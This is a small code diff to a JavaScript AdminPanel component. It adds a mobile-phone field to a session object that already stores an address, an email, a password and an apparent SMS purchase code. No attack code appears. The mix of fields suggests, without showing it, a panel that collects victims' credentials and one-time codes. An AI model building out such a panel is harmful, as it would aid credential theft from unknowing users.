@@ -310,7 +310,8 @@ export default function AdminPanel() {
                 smsCompra: null,
                 direccion: null,
                 correo: null,
-                contrasena: null
+                contrasena: null,
+                celular: null
               };
               
               return [newSession, ...prev]; // Agregar al inicio de la lista
